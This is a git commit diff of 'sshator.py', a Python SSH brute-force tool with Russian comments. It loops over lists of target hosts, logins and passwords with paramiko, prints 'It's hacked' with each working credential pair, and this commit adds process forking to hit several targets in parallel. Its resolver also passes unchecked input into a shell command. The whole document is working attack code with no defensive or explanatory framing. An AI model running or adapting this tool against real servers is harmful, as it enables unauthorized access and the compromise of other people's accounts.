e11c7d12ba26616765bb4d401f956f28a58662cc
itJunky <alphaQu4z4r@gmail.com>
2012-10-26 15:43:36 +0400

    Forks added

--- sshator.py
+++ sshator.py
@@ -1,9 +1,10 @@
-#! /usr/bin/python3
+#! /usr/bin/python
 # -*- coding: utf-8 -*-
 
 from paramiko import *	# Избавляемся от префикса paramiko
 import commands 		# Либа для выполнения системной команды host в функции резолва доменов 
 import socket			# Избавляемся от ошибки в эксепшне обрыва соединения
+import os
 
 # Открываем файлы
 targets = 	open('./targets.lst').readlines()
@@ -16,10 +17,11 @@ client = SSHClient()				# Создаём объект
 client.load_system_host_keys()		# Подгружаем ключи хостов, а если ключа не нашлось =>
 client.set_missing_host_key_policy(AutoAddPolicy()) # => добавляем автоматически
 
+error=''; #trg=''; lgn=''; psw='' # Глобальные переменные
+
 def resolv(host_n):
-	'''Возвращает Return ip from given string. If given string is domain,
-		resolv() has returned resolved ip, else if string is ip,
-		resolv() simply return this ip'''
+	'''Возвращает IP из полученной строки. Если строка содержит доменное имя,
+		resolv() возвращает IP, если же получен IP, то resolv() отдаёт именно его'''
 	cmd_s = "host " + host_n
 	res = commands.getoutput(cmd_s).split()[3]
 	if res == 'found:':
@@ -27,10 +29,12 @@ def resolv(host_n):
 	else:
 		return res
 
-### MAIN ###
-error=''
-for trg in targets:
-	trg = resolv(trg.strip())
+def child(target):
+	global error
+	#global trg
+	#global lgn
+	#global psw
+	print 'Child:', os.getpid()
 	for lgn in logins:
 		lgn = lgn.strip() 
 		if error == 'yes':
@@ -39,17 +43,29 @@ for trg in targets:
 		for psw in passwords:
 			psw = psw.strip()
 			try:
-				client.connect(trg, username = lgn, password = psw, timeout=2)
+				client.connect(target, username = lgn, password = psw, timeout=2)
 				stdin, stdout, stderr = client.exec_command('date')
-				#print stdout
-				print '!!! It\'s hacked', trg, '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
+				print stdout
+				print '!!! It\'s hacked', target, '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
 				print lgn, psw, '\n'
 			except SSHException:
-				print 'Wrong auth: ', trg, '\n', lgn, psw, '\n'
-				#print SSHException.message, '\n'
+				print 'Wrong auth: ', target, '\n', lgn, psw, '\n'
 			except socket.error:
-			#except :
-				print "Connection refused to host", trg, '\nGoing to next host\n\n'
+				print "Connection refused to host", target, '\nGoing to next host\n\n'
 				error='yes'
 				break # skip host if it refused
-	#print 'Next host'
+	
+	os._exit(0)
+
+def parent():
+	for trg in targets:
+		trg = resolv(trg.strip())
+		newpid = os.fork()
+		print newpid
+		if newpid == 0:
+			child(trg)
+		else:
+			print('Exit!\n')
+
+### MAIN ###
+parent()
